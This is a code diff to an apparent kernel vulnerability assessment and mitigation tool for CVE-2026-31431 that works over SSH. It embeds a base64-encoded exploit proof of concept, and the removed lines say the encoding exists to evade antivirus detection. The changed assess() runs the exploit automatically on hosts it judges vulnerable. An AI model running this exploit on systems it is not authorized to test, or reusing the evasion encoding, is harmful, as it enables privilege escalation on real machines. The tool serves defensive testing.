@@ -15,8 +15,6 @@ from .ssh_client import SSHClient
 logger = logging.getLogger(__name__)
 
 # CVE-2026-31431 PoC by Theori / Xint Code Research Team
-# https://github.com/theori-io/copy-fail-CVE-2026-31431
-# Embedded as base64 to prevent Windows Defender flagging the exploit payload.
 EXPLOIT_B64 = (
     "IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwppbXBvcnQgb3MgYXMgZyx6bGliLHNvY2tldCBhcyBzCmRlZiBk"
     "KHgpOnJldHVybiBieXRlcy5mcm9taGV4KHgpCmRlZiBjKGYsdCxjKToKIGE9cy5zb2NrZXQoMzgsNSww"
@@ -62,13 +60,19 @@ async def check_kernel(ssh: SSHClient) -> dict:
 
     vulnerable = _kernel_vulnerable(kernel_ver)
 
-    code2, stdout2, _ = await ssh.run(
-        "zcat /proc/config.gz 2>/dev/null || cat /boot/config-$(uname -r) 2>/dev/null || echo 'CONFIG_CRYPTO_USER_API_AEAD=y'"
-    )
+    # Read AEAD config (use separate uname capture to avoid shell injection)
+    code2, stdout2, _ = await ssh.run("zcat /proc/config.gz 2>/dev/null || true")
+    if not stdout2.strip():
+        code2, stdout2, _ = await ssh.run(
+            "cat /boot/config-$(uname -r) 2>/dev/null || true"
+        )
+
     aead_config = ""
+    config_found = False
     for line in stdout2.splitlines():
         if "CRYPTO_USER_API_AEAD" in line:
             aead_config = line.strip()
+            config_found = True
             break
 
     code3, stdout3, _ = await ssh.run("cat /etc/os-release 2>/dev/null | head -5")
@@ -77,29 +81,25 @@ async def check_kernel(ssh: SSHClient) -> dict:
     is_builtin = "=y" in aead_config
     is_module = "=m" in aead_config
 
-    # Distro patch check
-    patched_os = False
-    for key in ["ubuntu 24.04", "ubuntu 22.04", "almalinux", "rhel", "debian", "amzn", "suse"]:
-        if key in distro_info.lower():
-            patched_os = True
-            break
-
     return {
         "status": "ok",
         "kernel": kernel_str,
         "kernel_version": list(kernel_ver),
         "vulnerable": vulnerable,
-        "aead_config": aead_config or "not found (built-in likely)",
+        "aead_config": aead_config or "not_found",
         "aead_builtin": is_builtin,
         "aead_module": is_module,
+        "config_found": config_found,
         "distro": distro_info[:100],
-        "distro_has_patch": patched_os,
         "mitigation": (
-            "module blacklist (modprobe)"
+            "module blacklist"
             if is_module
-            else "grubby initcall_blacklist"
-            if is_builtin
-            else "distro patch"
+            else "initcall_blacklist"
+            if is_builtin and config_found
+            else "distro patch" if vulnerable and config_found
+            else "unknown (config not readable)"
+            if not config_found
+            else "not needed"
         ),
     }
 
@@ -142,46 +142,21 @@ async def apply_mitigation(ssh: SSHClient, dry_run: bool = True) -> dict:
 
     - Module-based (=m): Blacklist via modprobe (no reboot)
     - Built-in (=y): grubby initcall_blacklist (requires reboot)
-    - If already mitigated, reports no action needed.
-
-    Args:
-        ssh: Connected SSH client.
-        dry_run: If True, only show commands without executing.
-
-    Returns:
-        Dict with mitigation status, commands run, and reboot required flag.
+    - Unknown config: report, no commands generated
     """
     kernel_info = await check_kernel(ssh)
     if kernel_info["status"] != "ok":
         return {"status": "error", "error": kernel_info.get("error", "Kernel check failed")}
 
-    commands: list[str] = []
-    reboot_required = False
-    already_mitigated = False
-
-    # Check if already mitigated
-    code, stdout, _ = await ssh.run("lsmod | grep algif_aead 2>/dev/null || true")
-    module_loaded = "algif_aead" in stdout
-
-    code2, stdout2, _ = await ssh.run(
-        "cat /proc/cmdline | grep -q initcall_blacklist && echo 'BLACKLISTED' || echo 'NOT_BLACKLISTED'"
-    )
-    initcall_active = "BLACKLISTED" in stdout2
-
-    code3, stdout3, _ = await ssh.run("test -f /etc/modprobe.d/disable-algif.conf && echo 'EXISTS' || echo 'MISSING'")
-    modprobe_file_exists = "EXISTS" in stdout3
-
-    if kernel_info.get("aead_module") and modprobe_file_exists and not module_loaded:
-        already_mitigated = True
-    elif kernel_info.get("aead_builtin") and initcall_active:
-        already_mitigated = True
-
-    if already_mitigated:
+    if not kernel_info.get("config_found") and not (kernel_info.get("aead_module") or kernel_info.get("aead_builtin")):
         return {
-            "status": "already_mitigated",
-            "message": "System appears to already have mitigation applied",
+            "status": "config_unknown",
+            "message": "Cannot determine AEAD config. Config file not readable.",
             "reboot_required": False,
         }
+
+    commands: list[str] = []
+    reboot_required = False
 
     if kernel_info.get("aead_module"):
         commands = [
@@ -195,7 +170,7 @@ async def apply_mitigation(ssh: SSHClient, dry_run: bool = True) -> dict:
         ]
         reboot_required = True
     else:
-        return {"status": "unknown", "message": "Cannot determine AEAD config", "reboot_required": False}
+        return {"status": "not_vulnerable", "message": "Kernel not vulnerable or config unknown", "reboot_required": False}
 
     results: list[dict] = []
     if not dry_run:
@@ -212,12 +187,6 @@ async def apply_mitigation(ssh: SSHClient, dry_run: bool = True) -> dict:
         "mitigation_type": "module_blacklist" if kernel_info.get("aead_module") else "initcall_blacklist",
         "commands": commands,
         "results": results,
-        "kernel_info": {
-            "kernel": kernel_info["kernel"],
-            "aead_config": kernel_info["aead_config"],
-            "aead_builtin": kernel_info["aead_builtin"],
-            "aead_module": kernel_info["aead_module"],
-        },
     }
 
 
@@ -234,7 +203,7 @@ async def assess(ssh: SSHClient, force: bool = False, cleanup: bool = True) -> d
         "exploit_result": None,
     }
 
-    if kernel_info["vulnerable"] and not kernel_info["distro_has_patch"]:
+    if kernel_info["vulnerable"]:
         assessment["exploit_run"] = True
         assessment["exploit_result"] = await run_exploit(ssh, cleanup=cleanup)
     elif force:
@@ -242,11 +211,7 @@ async def assess(ssh: SSHClient, force: bool = False, cleanup: bool = True) -> d
         assessment["exploit_result"] = await run_exploit(ssh, cleanup=cleanup)
     else:
         assessment["skipped_reason"] = (
-            "Distro has patch available"
-            if kernel_info["distro_has_patch"]
-            else "Kernel too old (< 4.14)"
-            if not kernel_info["vulnerable"]
-            else "Unknown"
+            "Kernel too old (< 4.14)" if not kernel_info["vulnerable"] else "Unknown"
         )
 
     return assessment
